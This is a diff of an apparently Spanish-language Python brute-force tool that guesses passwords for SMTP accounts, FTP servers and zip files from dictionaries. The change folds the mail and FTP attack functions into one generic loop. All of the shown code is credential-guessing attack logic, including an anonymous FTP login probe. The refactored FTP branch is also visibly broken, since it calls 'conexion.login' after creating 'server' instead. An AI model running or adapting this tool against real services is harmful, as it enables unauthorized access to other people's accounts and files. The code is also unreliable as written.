@@ -21,9 +21,8 @@ def bforcezip(zipf, passwords):
 		else:
 			print("'{}' es la contraseña de {}.".format(password, zf))
 			exit()
-def bforcemail(users, passwords, server):
-	server = SMTP(server)
-	server.starttls()
+
+def bforce(users, passwords):
 	for user in users:
 		for password in passwords:
 			try:
@@ -34,31 +33,6 @@ def bforcemail(users, passwords, server):
 				print("{} es la clave de {}".format(password, user))
 				exit()
 		sleep(3)
-	server.quit()
-def bforceftp(users, passwords, server, tm):
-	conexion = FTP(server)
-	try:
-		conexion.login('anonymous', '')
-	except:
-		print("No se puede acceder al FTP de manera anonima.")
-	else:
-		print("El usuario es anonymous y no tiene contraseña.")
-		exit()
-
-	for user in users:
-		for password in passwords:
-			try:
-				conexion.login(user, password)
-			except Exception as e:
-				print("\n[*]{}".format(e))
-				sleep(tm)
-			else:
-				print("Servidor: {}".format(server))
-				print("Usuario: {}".format(user))				
-				print("Clave: {}".format(password))
-				exit()
-	conexion.quit()
-
 				
 
 def listaup(lista, count):
@@ -84,7 +58,7 @@ def listaupf(lista, count):
 def h():
 	print("\nOpciones:")
 	print("\nSe debe de especificar que se va a atacar:\nftp, smtp o un archivo.zip.")
-	print("\nmail: --mail\nftp: --ftp\n--zip\n\nLas banderas que se pueden usar en los 3 prametros:")
+	print("\nmail: --mail\nftp: --ftp\nzip: --zip\n\nLas banderas que se pueden usar en los 3 prametros:")
 	print("\n-u:  Se usa para establecer con que usuario ingresar (no sirve para el modo --zip).\n-uf: Establecer diccionario de usuarios (no sirve para el modo --zip).")
 	print("-p:  Sirve para establecer una contraseña.\n-pf: Establecer diccionario de contraseñas.")
 	#print("-t:  Sirve para establecer el tiempo entre cada intento.")
@@ -170,9 +144,19 @@ if __name__ == '__main__':
 			print("para usar --ftp se ocupa determinar una ip:\n-hst (ip del servidor ftp)")
 			exit()
 		elif ftp == True:
-			bforceftp(userslist, passwordlist, ip, time)
+			server = FTP(ip)
+			try:
+				conexion.login('anonymous', '')
+			except:
+				print("No se puede acceder al FTP de manera anonima.")
+			else:
+				print("El usuario es anonymous y no tiene contraseña.")
+				exit()
+			bforce(userslist, passwordlist)
 		elif mail == True and srv != "":
-			bforcemail(userslist, passwordlist, srv)
+			server = SMTP(srv)
+			server.starttls()
+			bforce(userslist, passwordlist)
 		elif mail == True and srv == "":
 			print("No se ha elegido un servidor smtp.")
 			exit()
